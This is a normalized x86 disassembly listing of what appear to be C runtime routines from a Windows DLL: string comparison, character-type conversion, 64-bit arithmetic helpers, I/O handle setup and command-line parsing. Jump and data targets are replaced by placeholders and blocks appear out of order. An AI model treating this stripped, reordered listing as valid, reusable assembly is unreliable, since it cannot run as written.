lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_1001662f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_1001a4e9
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000ac69
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_1001a532
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_1000bf59
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_1000b660
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_1001460a
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_1000c036
pop ecx
cmp eax ebx
je r-xdata
call sub_1001a250
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_100167e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1000afe5
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1001662f
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001682b
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_100168f0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_10016930
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_100169a0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_100169da
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_10011a2a
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_10011a2a
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_10016aab
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_100129fe
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10016aec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_100129fe
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_10016b1e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_10012924
pop ecx
pop ebp
retn
sub_10016b5a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_10012924
pop ecx
pop ebp
retn
sub_10016b89
push 0x54
push r--data
call sub_10011ecc
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_10011a2a
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_10011a2a
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_10011f11
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10019a15
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10019a15
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_10016ddd
mov edi edi
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_1000bf59
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x40
add eax 0x800
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_10016e2b
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_1000e021
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_10011a2a
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_1000b9b0
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_1000b9b0
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_1000bf59
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_10011a2a
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_1000bf59
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_1001479b
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1000e74b
add esp 0x14
sub_10016f09
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_1001a96b
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
